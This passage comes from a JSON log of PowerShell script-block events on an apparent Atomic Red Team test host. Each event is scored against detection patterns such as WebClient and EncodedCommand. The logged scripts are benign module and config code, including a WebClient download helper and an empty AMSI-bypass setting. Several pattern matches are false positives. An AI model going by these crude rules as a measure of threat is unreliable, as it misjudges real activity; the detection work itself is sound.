$data.GetType()\n    if ($data -isnot [System.Object]) {\n        return $data -as $dataType\n    }\n\n    if ($dataType.FullName -eq \"System.Management.Automation.PSCustomObject\") {\n        return Convert-PSCustomObjectToDictionary $data\n    } elseif (([System.Collections.Specialized.OrderedDictionary].IsAssignableFrom($dataType))){\n        return Convert-OrderedHashtableToDictionary $data\n    } elseif (([System.Collections.IDictionary].IsAssignableFrom($dataType))){\n        return Convert-HashtableToDictionary $data\n    } elseif (([System.Collections.IList].IsAssignableFrom($dataType))) {\n        return Convert-ListToGenericList $data\n    }\n    return $data -as $dataType\n}\n\nfunction ConvertFrom-Yaml {\n    [CmdletBinding()]\n    Param(\n        [Parameter(Mandatory=$false, ValueFromPipeline=$true, Position=0)]\n        [string]$Yaml,\n        [switch]$AllDocuments=$false,\n        [switch]$Ordered,\n        [switch]$UseMergingParser=$false\n    )\n\n    BEGIN {\n        $d = \"\"\n    }\n    PROCESS {\n        if($Yaml -is [string]) {\n            $d += $Yaml + \"`n\"\n        }\n    }\n\n    END {\n        if($d -eq \"\"){\n            return\n        }\n        $documents = Get-YamlDocuments -Yaml $d -UseMergingParser:$UseMergingParser\n        if (!$documents.Count) {\n            return\n        }\n        if($documents.Count -eq 1){\n            return Convert-YamlDocumentToPSObject $documents[0].RootNode -Ordered:$Ordered\n        }\n        if(!$AllDocuments) {\n            return Convert-YamlDocumentToPSObject $documents[0].RootNode -Ordered:$Ordered\n        }\n        $ret = @()\n        foreach($i in $documents) {\n            $ret += Convert-YamlDocumentToPSObject $i.RootNode -Ordered:$Ordered\n        }\n        return $ret\n    }\n}\n\n$stringQuotingEmitterSource = @\"\nusing System;\nusing System.Text.RegularExpressions;\nusing YamlDotNet;\nusing YamlDotNet.Core;\nusing YamlDotNet.Serialization;\nusing YamlDotNet.Serialization.EventEmitters;\npublic class StringQuotingEmitter: ChainedEventEmitter {\n    // Patterns from https://yaml.org/spec/1.2/spec.html#id2804356\n    private static Regex quotedRegex = new Regex(@`\"^(\\~|null|true|false|on|off|yes|no|y|n|[-+]?(\\.[0-9]+|[0-9]+(\\.[0-9]*)?)([eE][-+]?[0-9]+)?|[-+]?(\\.inf))?$`\", RegexOptions.Compiled | RegexOptions.IgnoreCase);\n    public StringQuotingEmitter(IEventEmitter next): base(next) {}\n\n    public override void Emit(ScalarEventInfo eventInfo, IEmitter emitter) {\n        var typeCode = eventInfo.Source.Value != null\n        ? Type.GetTypeCode(eventInfo.Source.Type)\n        : TypeCode.Empty;\n\n        switch (typeCode) {\n            case TypeCode.Char:\n                if (Char.IsDigit((char)eventInfo.Source.Value)) {\n                    eventInfo.Style = ScalarStyle.DoubleQuoted;\n                }\n                break;\n            case TypeCode.String:\n                var val = eventInfo.Source.Value.ToString();\n                if (quotedRegex.IsMatch(val))\n                {\n                    eventInfo.Style = ScalarStyle.DoubleQuoted;\n                } else if (val.IndexOf('\\n') > -1) {\n                    eventInfo.Style = ScalarStyle.Literal;\n                }\n                break;\n        }\n\n        base.Emit(eventInfo, emitter);\n    }\n\n    public static SerializerBuilder Add(SerializerBuilder builder) {\n        return builder.WithEventEmitter(next => new StringQuotingEmitter(next));\n    }\n}\n\"@\n\nif (!([System.Management.Automation.PSTypeName]'StringQuotingEmitter').Type) {\n    $referenceList = @([YamlDotNet.Serialization.Serializer].Assembly.Location,[Text.RegularExpressions.Regex].Assembly.Location)\n    if ($PSVersionTable.PSEdition -eq \"Core\") {\n        $referenceList += [IO.Directory]::GetFiles([IO.Path]::Combine($PSHOME, 'ref'), 'netstandard.dll', [IO.SearchOption]::TopDirectoryOnly)\n        Add-Type -TypeDefinition $stringQuotingEmitterSource -ReferencedAssemblies $referenceList -Language CSharp -CompilerOptions \"-nowarn:1701\"\n    } else {\n        Add-Type -TypeDefinition $stringQuotingEmitterSource -ReferencedAssemblies $referenceList -Language CSharp\n    }\n}\n\nfunction Get-Serializer {\n    Param(\n        [Parameter(Mandatory=$true)][SerializationOptions]$Options\n    )\n    \n    $builder = New-Object \"YamlDotNet.Serialization.SerializerBuilder\"\n    \n    if ($Options.HasFlag([SerializationOptions]::Roundtrip)) {\n        $builder = $builder.EnsureRoundtrip()\n    }\n    if ($Options.HasFlag([SerializationOptions]::DisableAliases)) {\n        $builder = $builder.DisableAliases()\n    }\n    if ($Options.HasFlag([SerializationOptions]::EmitDefaults)) {\n        $builder = $builder.EmitDefaults()\n    }\n    if ($Options.HasFlag([SerializationOptions]::JsonCompatible)) {\n        $builder = $builder.JsonCompatible()\n    }\n    if ($Options.HasFlag([SerializationOptions]::DefaultToStaticType)) {\n        $builder = $builder.WithTypeResolver((New-Object \"YamlDotNet.Serialization.TypeResolvers.StaticTypeResolver\"))\n    }\n    if ($Options.HasFlag([SerializationOptions]::WithIndentedSequences)) {\n        $builder = $builder.WithIndentedSequences()\n    }\n    $builder = [StringQuotingEmitter]::Add($builder)\n    return $builder.Build()\n}\n\nfunction ConvertTo-Yaml {\n    [CmdletBinding(DefaultParameterSetName = 'NoOptions')]\n    Param(\n        [Parameter(ValueFromPipeline = $true, Position=0)]\n        [System.Object]$Data,\n\n        [string]$OutFile,\n\n        [Parameter(ParameterSetName = 'Options')]\n        [SerializationOptions]$Options = [SerializationOptions]::Roundtrip,\n\n        [Parameter(ParameterSetName = 'NoOptions')]\n        [switch]$JsonCompatible,\n        \n        [switch]$KeepArray,\n\n        [switch]$Force\n    )\n    BEGIN {\n        $d = [System.Collections.Generic.List[object]](New-Object \"System.Collections.Generic.List[object]\")\n    }\n    PROCESS {\n        if($data -is [System.Object]) {\n            $d.Add($data)\n        }\n    }\n    END {\n        if ($d -eq $null -or $d.Count -eq 0) {\n            return\n        }\n        if ($d.Count -eq 1 -and !($KeepArray)) {\n            $d = $d[0]\n        }\n        $norm = Convert-PSObjectToGenericObject $d\n        if ($OutFile) {\n            $parent = Split-Path $OutFile\n            if (!(Test-Path $parent)) {\n                Throw \"Parent folder for specified path does not exist\"\n            }\n            if ((Test-Path $OutFile) -and !$Force) {\n                Throw \"Target file already exists. Use -Force to overwrite.\"\n            }\n            $wrt = New-Object \"System.IO.StreamWriter\" $OutFile\n        } else {\n            $wrt = New-Object \"System.IO.StringWriter\"\n        }\n    \n        if ($PSCmdlet.ParameterSetName -eq 'NoOptions') {\n            $Options = 0\n            if ($JsonCompatible) {\n                # No indent options :~(\n                $Options = [SerializationOptions]::JsonCompatible\n            }\n        }\n\n        try {\n            $serializer = Get-Serializer $Options\n            $serializer.Serialize($wrt, $norm)\n        }\n        catch{\n            $_\n        }\n        finally {\n            $wrt.Close()\n        }\n        if ($OutFile) {\n            return\n        } else {\n            return $wrt.ToString()\n        }\n    }\n}\n\nNew-Alias -Name cfy -Value ConvertFrom-Yaml\nNew-Alias -Name cty -Value ConvertTo-Yaml\n\nExport-ModuleMember -Function ConvertFrom-Yaml,ConvertTo-Yaml -Alias cfy,cty\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'WebClient' matched: 'http'\nPattern 'WebClient' matched: 'http'\nPattern 'WebClient' matched: 'http'"
    },
    {
      "timestamp": "2024-12-16T20:34:55.962765+00:00",
      "event_id": 35710848,
      "risk_score": 6,
      "detected_patterns": ", WebClient, Get",
      "pattern_details": "WebClient [Score: 5]; Get [Score: 1]",
      "command_length": 5396,
      "full_command": "\n$artConfig = [PSCustomObject]@{\n\n  # [optional] These two configs are calculated programatically, you probably don't need to change them\n  basehostname               = $((hostname | Select-String -Pattern \"(.*?)(-[0-9a-fA-F]{8}-([0-9a-fA-F]{4}-){3}[0-9a-fA-F]{12})?$\").Matches.Groups[1].value)\n  OS                         = $( if ($IsLinux) { \"linux\" } elseif ($IsMacOS) { \"macos\" } else { \"windows\" })\n\n  # [optional(if using default install paths)] Paths to your Atomic Red Team \"atomics\" folder and your \"invoke-atomicredteam\" folder\n  PathToInvokeFolder         = Join-Path $( if ($IsLinux -or $IsMacOS) { \"~\" } else { \"C:\" })  \"/AtomicRedTeam/invoke-atomicredteam\" # this is the default install path so you probably don't need to change this\n  PathToPublicAtomicsFolder  = Join-Path $( if ($IsLinux -or $IsMacOS) { \"~\" } else { \"C:\" })  \"AtomicRedTeam/atomics\" # this is the default install path so you probably don't need to change this\n  PathToPrivateAtomicsFolder = Join-Path $( if ($IsLinux -or $IsMacOS) { \"~\" } else { \"C:\" })   \"PrivateAtomics/atomics\" # if you aren't providing your own private atomics that are custom written by you, just leave this as is\n\n  # [ Optional ] The user that will be running each atomic test\n  user                       = $( if ($IsLinux -or $IsMacOS) { $env:USER } else { \"$env:USERDOMAIN\\$env:USERNAME\" }) # example \"corp\\atomicrunner\"\n\n  # [optional] the path where you want the folder created that houses the logs and the runner schedule. Defaults to users home directory\n  basePath                   = $( if (!$IsLinux -and !$IsMacOS) { $env:USERPROFILE } else { $env:HOME }) # example \"C:\\Users\\atomicrunner\"\n\n  # [optional]\n  scheduleTimeSpan           = New-TimeSpan -Days 7 # the time in which all tests on the schedule should complete\n  kickOffDelay               = New-TimeSpan -Minutes 0 # an additional delay before Invoke-KickoffAtomicRunner calls Invoke-AtomicRunner\n  scheduleFileName           = \"AtomicRunnerSchedule.csv\"\n\n  # [optional] Logging Module, uses Syslog-ExecutionLogger if left blank and the syslogServer and syslogPort are set, otherwise it uses the Default-ExecutionLogger\n  LoggingModule              = ''\n\n  # [optional] Syslog configuration, default execution logs will be sent to this server:port\n  syslogServer               = '' # set to empty string '' if you don't want to log atomic execution details to a syslog server (don't includle http(s):\\\\)\n  syslogPort                 = 514\n  syslogProtocol             = 'UDP' # options are UDP, TCP, TCPwithTLS\n\n  verbose                    = $true; # set to true for more log output\n\n  # [optional] logfile filename configs\n  logFolder                  = \"AtomicRunner-Logs\"\n  timeLocal                  = (Get-Date(get-date) -uformat \"%Y-%m-%d\").ToString()\n  logFileName                = \"$($artConfig.timeLocal)`_$($artConfig.basehostname)-ExecLog.csv\"\n\n  # amsi bypass script block (applies to Windows only)\n  absb                       = $null\n\n  # AtomicRunnerService install directory\n  ServiceInstallDir                 = \"${ENV:windir}\\System32\"\n\n}\n\n# If you create a file called privateConfig.ps1 in the same directory as you installed Invoke-AtomicRedTeam you can overwrite any of these settings with your custom values\n$root = Split-Path (Split-Path $PSScriptRoot -Parent) -Parent\n$pathToPrivateConfig = Join-Path $root \"privateConfig.ps1\"\nif (Test-Path ($pathToPrivateConfig)) {\n  if ($IsLinux -or $IsMacOS) {\n    chmod +x $pathToPrivateConfig\n  }\n  & ($pathToPrivateConfig)\n}\n\n#####################################################################################\n# All of the configs below are calculated using the script block in the \"Value\" field.\n# This way, when you change the 'basePath' everything else is updated.\n# You should probably leave all of the stuff below alone.\n#####################################################################################\n\n$scriptParam = @{\n  MemberType  = \"ScriptProperty\"\n  InputObject = $artConfig\n  Name        = \"runnerFolder\"\n  Value       = { Join-Path $artConfig.basePath \"AtomicRunner\" }\n}\nAdd-Member @scriptParam\n\n$scriptParam = @{\n  MemberType  = \"ScriptProperty\"\n  InputObject = $artConfig\n  Name        = \"atomicLogsPath\"\n  Value       = { Join-Path $artConfig.basePath $artConfig.logFolder }\n}\nAdd-Member @scriptParam\n\n$scriptParam = @{\n  MemberType  = \"ScriptProperty\"\n  InputObject = $artConfig\n  Name        = \"scheduleFile\"\n  Value       = { Join-Path $artConfig.runnerFolder  $artConfig.scheduleFileName }\n}\nAdd-Member @scriptParam\n\n$scriptParam = @{\n  MemberType  = \"ScriptProperty\"\n  InputObject = $artConfig\n  Name        = \"credFile\"\n  Value       = { Join-Path $artConfig.runnerFolder \"psc_$($artConfig.basehostname).txt\" }\n}\nAdd-Member @scriptParam\n\n$scriptParam = @{\n  MemberType  = \"ScriptProperty\"\n  InputObject = $artConfig\n  Name        = \"execLogPath\"\n  Value       = { Join-Path $artConfig.atomicLogsPath $artConfig.logFileName }\n}\nAdd-Member @scriptParam\n\n$scriptParam = @{\n  MemberType  = \"ScriptProperty\"\n  InputObject = $artConfig\n  Name        = \"stopFile\"\n  Value       = { Join-Path $artConfig.runnerFolder \"stop.txt\" }\n}\nAdd-Member @scriptParam\n\n$scriptParam = @{\n  MemberType  = \"ScriptProperty\"\n  InputObject = $artConfig\n  Name        = \"logFile\"\n  Value       = { Join-Path $artConfig.atomicLogsPath \"log-$($artConfig.basehostname).txt\" }\n}\nAdd-Member @scriptParam\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'WebClient' matched: 'http'\nPattern 'Get' matched: 'get-'"
    },
    {
      "timestamp": "2024-12-16T20:34:57.2459512+00:00",
      "event_id": 35711088,
      "risk_score": 6,
      "detected_patterns": ", WebClient, Get",
      "pattern_details": "WebClient [Score: 5]; Get [Score: 1]",
      "command_length": 1039,
      "full_command": "function Invoke-WebRequestVerifyHash ($url, $outfile, $hash) {\n    $success = $false\n    $null = @(\n        New-Item -ItemType Directory (Split-Path $outfile) -Force | Out-Null\n        $ms = New-Object IO.MemoryStream\n        [Net.ServicePointManager]::SecurityProtocol = ([Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12)\n        (New-Object System.Net.WebClient).OpenRead($url).copyto($ms)\n        $ms.seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null\n        $actualHash = (Get-FileHash -InputStream $ms).Hash\n        if ( $hash -eq $actualHash) {\n            $ms.seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null\n            $fileStream = New-Object IO.FileStream $outfile, ([System.IO.FileMode]::Create)\n            $ms.CopyTo($fileStream);\n            $fileStream.Close()\n            $success = $true\n        }\n        else {\n            Write-Host -ForegroundColor red \"File hash mismatch, expected: $hash, actual: $actualHash\"\n        }\n    )\n    $success\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:54.440574+00:00",
      "event_id": 35710570,
      "risk_score": 6,
      "detected_patterns": ", WebClient, Get",
      "pattern_details": "WebClient [Score: 5]; Get [Score: 1]",
      "command_length": 1039,
      "full_command": "function Invoke-WebRequestVerifyHash ($url, $outfile, $hash) {\n    $success = $false\n    $null = @(\n        New-Item -ItemType Directory (Split-Path $outfile) -Force | Out-Null\n        $ms = New-Object IO.MemoryStream\n        [Net.ServicePointManager]::SecurityProtocol = ([Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12)\n        (New-Object System.Net.WebClient).OpenRead($url).copyto($ms)\n        $ms.seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null\n        $actualHash = (Get-FileHash -InputStream $ms).Hash\n        if ( $hash -eq $actualHash) {\n            $ms.seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null\n            $fileStream = New-Object IO.FileStream $outfile, ([System.IO.FileMode]::Create)\n            $ms.CopyTo($fileStream);\n            $fileStream.Close()\n            $success = $true\n        }\n        else {\n            Write-Host -ForegroundColor red \"File hash mismatch, expected: $hash, actual: $actualHash\"\n        }\n    )\n    $success\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:53.9127937+00:00",
      "event_id": 35710484,
      "risk_score": 6,
      "detected_patterns": ", WebClient, Get",
      "pattern_details": "WebClient [Score: 5]; Get [Score: 1]",
      "command_length": 3535,
      "full_command": "@{\n\n    # Script module or binary module file associated with this manifest.\n    RootModule        = 'Invoke-AtomicRedTeam.psm1'\n\n    # Version number of this module.\n    ModuleVersion     = '2.1.0'\n\n    # ID used to uniquely identify this module\n    GUID              = '8f492621-18f8-432e-9532-b1d54d3e90bd'\n\n    # Author of this module\n    Author            = 'Casey Smith @subTee, Josh Rickard @MSAdministrator, Carrie Roberts @OrOneEqualsOne, Matt Graeber @mattifestation'\n\n    # Company or vendor of this module\n    CompanyName       = 'Red Canary, Inc.'\n\n    # Copyright statement for this module\n    Copyright         = '(c) 2021 Red Canary. All rights reserved.'\n\n    # Description of the functionality provided by this module\n    Description       = 'A PowerShell module that runs Atomic Red Team tests from yaml definition files.'\n\n    # Minimum version of the Windows PowerShell engine required by this module\n    PowerShellVersion = '5.0'\n\n    # Modules that must be imported into the global environment prior to importing this module\n    RequiredModules   = @('powershell-yaml')\n\n    # Script files (.ps1) that are run in the caller's environment prior to importing this module.\n    # AtomicClassSchema.ps1 needs to be present in the caller's scope in order for the built-in classes to surface properly.\n    ScriptsToProcess  = @('Private\\AtomicClassSchema.ps1', 'Public\\config.ps1')\n\n    # Functions to export from this module, for best performance, do not use wildcards and do not delete the entry, use an empty array if there are no functions to export.\n    FunctionsToExport = @(\n        'Invoke-AtomicTest',\n        'Get-AtomicTechnique',\n        'New-AtomicTechnique',\n        'New-AtomicTest',\n        'New-AtomicTestInputArgument',\n        'New-AtomicTestDependency',\n        'Start-AtomicGUI',\n        'Stop-AtomicGUI',\n        'Invoke-SetupAtomicRunner',\n        'Invoke-GenerateNewSchedule',\n        'Invoke-RefreshExistingSchedule',\n        'Invoke-AtomicRunner',\n        'Get-Schedule',\n        'Invoke-KickoffAtomicRunner',\n        'Get-PreferredIPAddress',\n        'Invoke-KillProcessTree'\n    )\n\n    # Variables to export from this module\n    VariablesToExport = '*'\n\n    NestedModules     = @(\n        \"Public\\Default-ExecutionLogger.psm1\",\n        \"Public\\Attire-ExecutionLogger.psm1\",\n        \"Public\\Syslog-ExecutionLogger.psm1\",\n        \"Public\\WinEvent-ExecutionLogger.psm1\"\n    )\n\n    # Private data to pass to the module specified in RootModule/ModuleToProcess. This may also contain a PSData hashtable with additional module metadata used by PowerShell.\n    PrivateData       = @{\n\n        PSData = @{\n\n            # Tags applied to this module. These help with module discovery in online galleries.\n            Tags         = @('Security', 'Defense')\n\n            # A URL to the license for this module.\n            LicenseUri   = 'https://github.com/redcanaryco/invoke-atomicredteam/blob/master/LICENSE.txt'\n\n            # A URL to the main website for this project.\n            ProjectUri   = 'https://github.com/redcanaryco/invoke-atomicredteam'\n\n            # A URL to an icon representing this module.\n            # IconUri = ''\n\n            # ReleaseNotes of this module\n            ReleaseNotes = @'\n1.0.2\n-----\n* Add support for custom execution loggers\n\n1.0.1\n-----\n* Adding 'powershell-yaml' to RequiredModules in the module manifest\n\n1.0.0\n-----\n* Initial release for submission to the PowerShell Gallery\n'@\n\n        } # End of PSData hashtable\n\n    } # End of PrivateData hashtable\n}",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'WebClient' matched: 'http'\nPattern 'WebClient' matched: 'http'"
    },
    {
      "timestamp": "2024-12-16T20:34:57.2066954+00:00",
      "event_id": 35711061,
      "risk_score": 6,
      "detected_patterns": ", EncodedCommand, SuspiciousCmdlet, Get",
      "pattern_details": "EncodedCommand [Score: 4]; SuspiciousCmdlet [Score: 1]; Get [Score: 1]",
      "command_length": 431,
      "full_command": "function Get-PreferredIPAddress($isWindows) {\n    if ($isWindows) {\n        return (Get-NetIPAddress | Where-Object { $_.PrefixOrigin -ne \"WellKnown\" }).IPAddress\n    }\n    elseif ($IsMacOS) {\n        return /sbin/ifconfig -l | /usr/bin/xargs -n1 /usr/sbin/ipconfig getifaddr\n    }\n    elseif ($IsLinux) {\n        return ip -4 -br addr show | sed -n -e 's/^.*UP\\s* //p' | cut -d \"/\" -f 1\n    }\n    else {\n        return ''\n    }\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'EncodedCommand' matched: '-e ''\nPattern 'SuspiciousCmdlet' matched: 'Get-NetIPAddress'"
    },
    {
      "timestamp": "2024-12-16T20:34:54.0512978+00:00",
      "event_id": 35710503,
      "risk_score": 6,
      "detected_patterns": ", WebClient, Get",
      "pattern_details": "WebClient [Score: 5]; Get [Score: 1]",
      "command_length": 16921,
      "full_command": "# Copyright 2016 Cloudbase Solutions Srl\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n#\n\nenum SerializationOptions {\n    None = 0\n    Roundtrip = 1\n    DisableAliases = 2\n    EmitDefaults = 4\n    JsonCompatible = 8\n    DefaultToStaticType = 16\n    WithIndentedSequences = 32\n}\n$here = Split-Path -Parent $MyInvocation.MyCommand.Path\n$assemblies = Join-Path $here \"Load-Assemblies.ps1\"\n$infinityRegex = [regex]::new('^[-+]?(\\.inf|\\.Inf|\\.INF)$', \"Compiled, CultureInvariant\");\n\nif (Test-Path $assemblies) {\n    . $here\\Load-Assemblies.ps1\n}\n\nfunction Get-YamlDocuments {\n    [CmdletBinding()]\n    Param(\n        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]\n        [string]$Yaml,\n        [switch]$UseMergingParser=$false\n    )\n    PROCESS {\n        $stringReader = new-object System.IO.StringReader($Yaml)\n        $parser = New-Object \"YamlDotNet.Core.Parser\" $stringReader\n        if($UseMergingParser) {\n            $parser = New-Object \"YamlDotNet.Core.MergingParser\" $parser\n        }\n\n        $yamlStream = New-Object \"YamlDotNet.RepresentationModel.YamlStream\"\n        $yamlStream.Load([YamlDotNet.Core.IParser] $parser)\n\n        $stringReader.Close()\n\n        return $yamlStream\n    }\n}\n\nfunction Convert-ValueToProperType {\n    [CmdletBinding()]\n    Param(\n        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]\n        [System.Object]$Node\n    )\n    PROCESS {\n        if (!($Node.Value -is [string])) {\n            return $Node\n        }\n        \n        if ([string]::IsNullOrEmpty($Node.Tag) -eq $false) {\n            switch($Node.Tag) {\n                \"tag:yaml.org,2002:str\" {\n                    return $Node.Value\n                }\n                \"tag:yaml.org,2002:null\" {\n                    return $null\n                }\n                \"tag:yaml.org,2002:bool\" {\n                    $parsedValue = $false\n                    if (![boolean]::TryParse($Node.Value, [ref]$parsedValue)) {\n                        Throw (\"failed to parse scalar {0} as boolean\" -f $Node)\n                    }\n                    return $parsedValue\n                }\n                \"tag:yaml.org,2002:int\" {\n                    $parsedValue = 0\n                    if ($node.Value.Length -gt 2) {\n                        switch ($node.Value.Substring(0, 2)) {\n                            \"0o\" {\n                                $parsedValue = [Convert]::ToInt64($Node.Value.Substring(2), 8)\n                            }\n                            \"0x\" {\n                                $parsedValue = [Convert]::ToInt64($Node.Value.Substring(2), 16)\n                            }\n                            default {\n                                if (![long]::TryParse($Node.Value, [Globalization.NumberStyles]::Any, [Globalization.CultureInfo]::InvariantCulture, [ref]$parsedValue)) {\n                                    Throw (\"failed to parse scalar {0} as long\" -f $Node)\n                                }\n                            }\n                        }\n                    } else {\n                        if (![long]::TryParse($Node.Value, [Globalization.NumberStyles]::Any, [Globalization.CultureInfo]::InvariantCulture, [ref]$parsedValue)) {\n                            Throw (\"failed to parse scalar {0} as long\" -f $Node)\n                        }\n                    }\n                    return $parsedValue\n                }\n                \"tag:yaml.org,2002:float\" {\n                    $parsedValue = 0.0\n                    if ($infinityRegex.Matches($Node.Value)) {\n                        $prefix = $Node.Value.Substring(0, 1)\n                        switch ($prefix) {\n                            \"-\" {\n                                return [double]::NegativeInfinity\n                            }\n                            default {\n                                # Prefix is either missing or is a +\n                                return [double]::PositiveInfinity\n                            }\n                        }\n                    }\n                    if (![double]::TryParse($Node.Value, [Globalization.NumberStyles]::Any, [Globalization.CultureInfo]::InvariantCulture, [ref]$parsedValue)) {\n                        Throw (\"failed to parse scalar {0} as double\" -f $Node)\n                    }\n                    return $parsedValue\n                }\n                \"tag:yaml.org,2002:timestamp\" {\n                    # From the YAML spec: http://yaml.org/type/timestamp.html\n                    [DateTime]$parsedValue = [DateTime]::MinValue\n                    $ts = [DateTime]::SpecifyKind($Node.Value, [System.DateTimeKind]::Utc)\n                    $tss = $ts.ToString(\"o\")\n                    if(![datetime]::TryParse($tss, $null, [System.Globalization.DateTimeStyles]::RoundtripKind, [ref] $parsedValue)) {\n                        Throw (\"failed to parse scalar {0} as DateTime\" -f $Node)\n                    }\n                    return $parsedValue\n                }\n            }\n        }\n\n        if ($Node.Style -eq 'Plain')\n        {\n            $types = @([int], [long], [double], [boolean], [decimal])\n            foreach($i in $types){\n                $parsedValue = New-Object -TypeName $i.FullName\n                if ($i.IsAssignableFrom([boolean])){\n                    $result = $i::TryParse($Node,[ref]$parsedValue) \n                } else {\n                    $result = $i::TryParse($Node, [Globalization.NumberStyles]::Any, [Globalization.CultureInfo]::InvariantCulture, [ref]$parsedValue)\n                }\n                if( $result ) {\n                    return $parsedValue\n                }\n            }\n        }\n\n        if ($Node.Style -eq 'Plain' -and $Node.Value -in '','~','null','Null','NULL') {\n            return $null\n        }\n\n        return $Node.Value\n    }\n}\n\nfunction Convert-YamlMappingToHashtable {\n    [CmdletBinding()]\n    Param(\n        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]\n        [YamlDotNet.RepresentationModel.YamlMappingNode]$Node,\n        [switch] $Ordered\n    )\n    PROCESS {\n        if ($Ordered) { $ret = [ordered]@{} } else { $ret = @{} }\n        foreach($i in $Node.Children.Keys) {\n            $ret[$i.Value] = Convert-YamlDocumentToPSObject $Node.Children[$i] -Ordered:$Ordered\n        }\n        return $ret\n    }\n}\n\nfunction Convert-YamlSequenceToArray {\n    [CmdletBinding()]\n    Param(\n        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]\n        [YamlDotNet.RepresentationModel.YamlSequenceNode]$Node,\n        [switch]$Ordered\n    )\n    PROCESS {\n        $ret = [System.Collections.Generic.List[object]](New-Object \"System.Collections.Generic.List[object]\")\n        foreach($i in $Node.Children){\n            $ret.Add((Convert-YamlDocumentToPSObject $i -Ordered:$Ordered))\n        }\n        return ,$ret\n    }\n}\n\nfunction Convert-YamlDocumentToPSObject {\n    [CmdletBinding()]\n    Param(\n        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]\n        [System.Object]$Node, \n        [switch]$Ordered\n    )\n    PROCESS {\n        switch($Node.GetType().FullName){\n            \"YamlDotNet.RepresentationModel.YamlMappingNode\"{\n                return Convert-YamlMappingToHashtable $Node -Ordered:$Ordered\n            }\n            \"YamlDotNet.RepresentationModel.YamlSequenceNode\" {\n                return Convert-YamlSequenceToArray $Node -Ordered:$Ordered\n            }\n            \"YamlDotNet.RepresentationModel.YamlScalarNode\" {\n                return (Convert-ValueToProperType $Node)\n            }\n        }\n    }\n}\n\nfunction Convert-HashtableToDictionary {\n    Param(\n        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]\n        [hashtable]$Data\n    )\n    foreach($i in $($data.Keys)) {\n        $Data[$i] = Convert-PSObjectToGenericObject $Data[$i]\n    }\n    return $Data\n}\n\nfunction Convert-OrderedHashtableToDictionary {\n    Param(\n        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]\n        [System.Collections.Specialized.OrderedDictionary] $Data\n    )\n    foreach ($i in $($data.Keys)) {\n        $Data[$i] = Convert-PSObjectToGenericObject $Data[$i]\n    }\n    return $Data\n}\n\nfunction Convert-ListToGenericList {\n    Param(\n        [Parameter(Mandatory=$false,ValueFromPipeline=$true)]\n        [array]$Data=@()\n    )\n    $ret = [System.Collections.Generic.List[object]](New-Object \"System.Collections.Generic.List[object]\")\n    for($i=0; $i -lt $Data.Count; $i++) {\n        $ret.Add((Convert-PSObjectToGenericObject $Data[$i]))\n    }\n    return ,$ret\n}\n\nfunction Convert-PSCustomObjectToDictionary {\n    Param(\n        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]\n        [PSCustomObject]$Data\n    )\n    $ret = [System.Collections.Generic.Dictionary[string,object]](New-Object 'System.Collections.Generic.Dictionary[string,object]')\n    foreach ($i in $Data.psobject.properties) {\n        $ret[$i.Name] = Convert-PSObjectToGenericObject $i.Value\n    }\n    return $ret\n}\n\nfunction Convert-PSObjectToGenericObject {\n    Param(\n        [Parameter(Mandatory=$false,ValueFromPipeline=$true)]\n        [System.Object]$Data\n    )\n\n    if ($null -eq $data) {\n        return $data\n    }\n\n    $dataType = $data.GetType()\n    if ($data -isnot [System.Object]) {\n        return $data -as $dataType\n    }\n\n    if ($dataType.FullName -eq \"System.Management.Automation.PSCustomObject\") {\n        return Convert-PSCustomObjectToDictionary $data\n    } elseif (([System.Collections.Specialized.OrderedDictionary].IsAssignableFrom($dataType))){\n        return Convert-OrderedHashtableToDictionary $data\n    } elseif (([System.Collections.IDictionary].IsAssignableFrom($dataType))){\n        return Convert-HashtableToDictionary $data\n    } elseif (([System.Collections.IList].IsAssignableFrom($dataType))) {\n        return Convert-ListToGenericList $data\n    }\n    return $data -as $dataType\n}\n\nfunction ConvertFrom-Yaml {\n    [CmdletBinding()]\n    Param(\n        [Parameter(Mandatory=$false, ValueFromPipeline=$true, Position=0)]\n        [string]$Yaml,\n        [switch]$AllDocuments=$false,\n        [switch]$Ordered,\n        [switch]$UseMergingParser=$false\n    )\n\n    BEGIN {\n        $d = \"\"\n    }\n    PROCESS {\n        